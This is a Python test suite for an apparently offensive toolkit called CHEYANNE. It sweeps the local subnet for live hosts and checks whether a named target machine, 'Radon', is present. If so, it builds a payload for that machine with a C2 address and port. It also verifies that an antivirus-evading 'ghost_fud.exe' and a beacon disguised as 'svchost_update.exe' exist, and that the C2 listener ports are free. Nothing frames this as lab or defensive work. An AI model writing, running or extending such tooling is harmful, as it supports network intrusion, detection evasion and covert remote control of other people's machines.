"""
test_auto_full.py — CHEYANNE full automated test suite with LAN scan.

Runs a sequenced battery of checks covering the local chain, LAN recon,
payload build, FUD checks, beacon checks, and port availability.

Usage:
    python test_auto_full.py
    python test_auto_full.py [--radon-ip 192.168.1.145] [--skip-local] [--scan-only]

Exit 0 if all non-skipped tests pass, 1 if any fail.
"""

import os
import sys
import json
import time
import socket
import struct
import argparse
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

ROOT = os.path.dirname(os.path.abspath(__file__))

# ---------------------------------------------------------------------------
# ANSI helpers
# ---------------------------------------------------------------------------
_RESET  = "\033[0m"
_GREEN  = "\033[32m"
_RED    = "\033[31m"
_AMBER  = "\033[33m"
_BOLD   = "\033[1m"
_GREY   = "\033[90m"
_CYAN   = "\033[36m"

PASS  = f"{_GREEN}{_BOLD}PASS{_RESET}"
FAIL  = f"{_RED}{_BOLD}FAIL{_RESET}"
SKIP  = f"{_AMBER}{_BOLD}SKIP{_RESET}"

def _w(label, result, detail=""):
    tag = {True: PASS, False: FAIL, None: SKIP}[result]
    line = f"  [{tag}] {label}"
    if detail:
        line += f"  {_GREY}{detail}{_RESET}"
    print(line)
    return result


# ---------------------------------------------------------------------------
# LAN scanning
# ---------------------------------------------------------------------------

SCAN_PORTS   = [445, 135, 22, 80]
SCAN_TIMEOUT = 0.5
SCAN_WORKERS = 50


def _tcp_connect(host, port, timeout=SCAN_TIMEOUT):
    """Returns True if TCP connect to host:port succeeds within timeout."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False


def _is_live(host):
    """Returns True if any of the SCAN_PORTS responds on host."""
    for port in SCAN_PORTS:
        if _tcp_connect(host, port):
            return True
    return False


def get_own_lan_ip():
    """
    Derives this machine's LAN IP by connecting a UDP socket to a routable
    address (no packets actually sent).
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "192.168.1.1"


def scan_lan(base_ip=None, workers=SCAN_WORKERS, timeout=SCAN_TIMEOUT, verbose=True):
    """
    Discovers live hosts on the /24 LAN subnet.

    Args:
        base_ip  : str — any IP on the target /24 (auto-detects own LAN IP if None)
        workers  : int — thread pool size
        timeout  : float — per-port connect timeout in seconds
        verbose  : bool — print progress dots

    Returns:
        list[str] — sorted list of live IPs
    """
    if base_ip is None:
        base_ip = get_own_lan_ip()

    # Derive /24 prefix
    parts = base_ip.split(".")
    prefix = ".".join(parts[:3])

    targets = [f"{prefix}.{i}" for i in range(1, 255)]
    live = []

    if verbose:
        print(f"  {_GREY}Scanning {prefix}.1/24 ({len(targets)} hosts, {workers} threads){_RESET}")

    with ThreadPoolExecutor(max_workers=workers) as ex:
        futures = {ex.submit(_is_live, ip): ip for ip in targets}
        done = 0
        for fut in as_completed(futures):
            ip = futures[fut]
            done += 1
            try:
                if fut.result():
                    live.append(ip)
                    if verbose:
                        print(f"  {_CYAN}  FOUND: {ip}{_RESET}")
            except Exception:
                pass
            if verbose and done % 50 == 0:
                print(f"  {_GREY}  ... {done}/{len(targets)}{_RESET}", end="\r")

    live.sort(key=lambda ip: int(ip.split(".")[-1]))
    return live


# ---------------------------------------------------------------------------
# Individual tests
# ---------------------------------------------------------------------------

def test_local_chain():
    """
    Test 1: Runs test_local_chain.py --skip-build and checks return code.
    """
    script = os.path.join(ROOT, "test_local_chain.py")
    if not os.path.exists(script):
        return _w("Local chain test", None, "test_local_chain.py not found — skipped")

    t0 = time.time()
    try:
        result = subprocess.run(
            [sys.executable, script, "--skip-build"],
            cwd=ROOT,
            timeout=120,
            capture_output=True,
        )
        elapsed = time.time() - t0
        passed = result.returncode == 0
        detail = f"exit={result.returncode} ({elapsed:.1f}s)"
        if not passed and result.stdout:
            last = result.stdout.decode(errors="replace").strip().splitlines()
            detail += f" | {last[-1][:80]}" if last else ""
        return _w("Local chain test (--skip-build)", passed, detail)
    except subprocess.TimeoutExpired:
        return _w("Local chain test (--skip-build)", False, "timed out after 120s")
    except Exception as e:
        return _w("Local chain test (--skip-build)", False, str(e))


def test_lan_scan(radon_ip="192.168.1.145"):
    """
    Test 2: LAN scan — returns (live_hosts, radon_found, radon_ip_used).
    """
    own_ip  = get_own_lan_ip()
    parts   = own_ip.split(".")
    prefix  = ".".join(parts[:3])

    print(f"  {_GREY}Own IP: {own_ip}  |  Scanning {prefix}.0/24{_RESET}")
    live = scan_lan(own_ip, verbose=True)

    passed = len(live) > 0
    detail = f"{len(live)} hosts live"
    if live:
        detail += f" | {', '.join(live[:5])}"
        if len(live) > 5:
            detail += f" ... +{len(live)-5}"
    _w("LAN scan (discovered live hosts)", passed, detail)
    return live


def test_radon_detect(live_hosts, radon_ip="192.168.1.145"):
    """
    Test 3: Checks for Radon machine specifically plus any 192.168.1.x host.
    """
    radon_exact = radon_ip in live_hosts
    subnet_hits = [h for h in live_hosts if h.startswith("192.168.1.")]

    detail = ""
    if radon_exact:
        detail = f"{radon_ip} FOUND"
    else:
        detail = f"{radon_ip} not found"
    if subnet_hits:
        detail += f" | 192.168.1.x: {', '.join(subnet_hits[:5])}"
    else:
        detail += " | no 192.168.1.x hosts"

    # Not a hard failure — report found/not-found
    _w("Radon detect (192.168.1.x)", None if not radon_exact else True,
       detail)
    return radon_exact, subnet_hits


def test_payload_build(radon_detected, radon_ip="192.168.1.92", c2_port=4443):
    """
    Test 4: Build payload for Radon target.
      - If recon/last_imported.json exists: use payload_auto.py
      - Else: use build_ghost_loader.py --v3
    Skipped if Radon not detected.
    """
    if not radon_detected:
        return _w("Payload build for Radon", None, "Radon not detected — skipped")

    recon_json   = os.path.join(ROOT, "recon", "last_imported.json")
    payload_auto = os.path.join(ROOT, "payload_auto.py")
    ghost_build  = os.path.join(ROOT, "build_ghost_loader.py")

    if os.path.exists(recon_json) and os.path.exists(payload_auto):
        cmd    = [sys.executable, payload_auto, recon_json, radon_ip, str(c2_port)]
        script = "payload_auto.py"
    elif os.path.exists(ghost_build):
        cmd    = [sys.executable, ghost_build, radon_ip, str(c2_port), "--v3"]
        script = "build_ghost_loader.py --v3"
    else:
        return _w("Payload build for Radon", None,
                  "Neither payload_auto.py nor build_ghost_loader.py found — skipped")

    try:
        result = subprocess.run(cmd, cwd=ROOT, timeout=120, capture_output=True)
        passed = result.returncode == 0
        detail = f"via {script} | exit={result.returncode}"
        return _w("Payload build for Radon", passed, detail)
    except subprocess.TimeoutExpired:
        return _w("Payload build for Radon", False, "timed out after 120s")
    except Exception as e:
        return _w("Payload build for Radon", False, str(e))


def test_fud_check():
    """
    Test 5: Checks ghost_fud.exe exists in fud_output/ or ROOT and is > 50KB.
    """
    candidates = [
        os.path.join(ROOT, "ghost_fud.exe"),
        os.path.join(ROOT, "fud_output", "ghost_fud.exe"),
    ]
    found = None
    for c in candidates:
        if os.path.exists(c):
            found = c
            break

    if found is None:
        return _w("FUD check (ghost_fud.exe)", None, "ghost_fud.exe not found — skipped")

    size_kb = os.path.getsize(found) / 1024
    passed  = size_kb > 50
    detail  = f"{os.path.relpath(found, ROOT)} | {size_kb:.1f} KB"
    return _w("FUD check (ghost_fud.exe > 50KB)", passed, detail)


def test_beacon_check():
    """
    Test 6: Checks agent/dist/svchost_update.exe exists.
    """
    beacon = os.path.join(ROOT, "agent", "dist", "svchost_update.exe")
    exists = os.path.exists(beacon)
    detail = beacon if exists else "not found"
    return _w("Beacon check (agent/dist/svchost_update.exe)", exists, detail)


def test_port_check(ports=(4443, 8890)):
    """
    Test 7: Verifies specified ports are NOT already bound on 0.0.0.0.
    Returns True if all ports are free.
    """
    all_free = True
    details  = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("0.0.0.0", port))
            s.close()
            details.append(f":{port} FREE")
        except OSError:
            details.append(f":{port} BOUND")
            all_free = False

    return _w(
        f"Port check ({', '.join(str(p) for p in ports)} not already bound)",
        all_free,
        " | ".join(details),
    )


# ---------------------------------------------------------------------------
# Main runner
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="CHEYANNE full automated test suite"
    )
    parser.add_argument("--radon-ip",   default="192.168.1.145",
                        help="Radon machine IP to look for (default: 192.168.1.145)")
    parser.add_argument("--c2-ip",      default="192.168.1.92",
                        help="C2 IP for payload build (default: 192.168.1.92)")
    parser.add_argument("--c2-port",    default=4443, type=int,
                        help="C2 port (default: 4443)")
    parser.add_argument("--skip-local", action="store_true",
                        help="Skip the local chain test")
    parser.add_argument("--scan-only",  action="store_true",
                        help="Only run LAN scan + Radon detect, then exit")
    args = parser.parse_args()

    # -----------------------------------------------------------------------
    print(f"\n{_BOLD}{'='*55}{_RESET}")
    print(f"{_BOLD}  CHEYANNE — AUTOMATED TEST SUITE{_RESET}")
    print(f"{_BOLD}{'='*55}{_RESET}\n")

    results  = []   # True/False/None per test
    n_pass   = 0
    n_fail   = 0
    n_skip   = 0

    def record(r):
        results.append(r)
        nonlocal n_pass, n_fail, n_skip
        if r is True:
            n_pass += 1
        elif r is False:
            n_fail += 1
        else:
            n_skip += 1

    # -----------------------------------------------------------------------
    # TEST 1 — Local chain
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[1] Local chain test{_RESET}")
    if args.skip_local:
        record(_w("Local chain test (--skip-build)", None, "--skip-local flag set"))
    else:
        record(test_local_chain())
    print()

    # -----------------------------------------------------------------------
    # TEST 2 — LAN scan
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[2] LAN scan{_RESET}")
    live_hosts = test_lan_scan(args.radon_ip)
    record(len(live_hosts) > 0)
    print()

    if args.scan_only:
        print(f"{_GREY}--scan-only: stopping after scan.{_RESET}\n")
        _print_summary(n_pass, n_fail, n_skip, results)
        sys.exit(0 if n_fail == 0 else 1)

    # -----------------------------------------------------------------------
    # TEST 3 — Radon detect
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[3] Radon detect{_RESET}")
    radon_found, _subnet = test_radon_detect(live_hosts, args.radon_ip)
    record(None)          # report-only, not a hard pass/fail
    print()

    # -----------------------------------------------------------------------
    # TEST 4 — Payload build
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[4] Payload build (Radon){_RESET}")
    record(test_payload_build(radon_found, args.c2_ip, args.c2_port))
    print()

    # -----------------------------------------------------------------------
    # TEST 5 — FUD check
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[5] FUD check{_RESET}")
    record(test_fud_check())
    print()

    # -----------------------------------------------------------------------
    # TEST 6 — Beacon check
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[6] Beacon check{_RESET}")
    record(test_beacon_check())
    print()

    # -----------------------------------------------------------------------
    # TEST 7 — Port check
    # -----------------------------------------------------------------------
    print(f"{_BOLD}[7] Port check{_RESET}")
    record(test_port_check((4443, 8890)))
    print()

    # -----------------------------------------------------------------------
    # Summary
    # -----------------------------------------------------------------------
    _print_summary(n_pass, n_fail, n_skip, results)
    sys.exit(0 if n_fail == 0 else 1)


def _print_summary(n_pass, n_fail, n_skip, results):
    total = len([r for r in results if r is not None])
    print(f"{_BOLD}{'='*55}{_RESET}")
    colour = _GREEN if n_fail == 0 else _RED
    print(f"{_BOLD}{colour}  RESULT: {n_pass}/{total} tests passed"
          f"  ({n_skip} skipped){_RESET}")
    print(f"{_BOLD}{'='*55}{_RESET}\n")


# ---------------------------------------------------------------------------
if __name__ == "__main__":
    main()
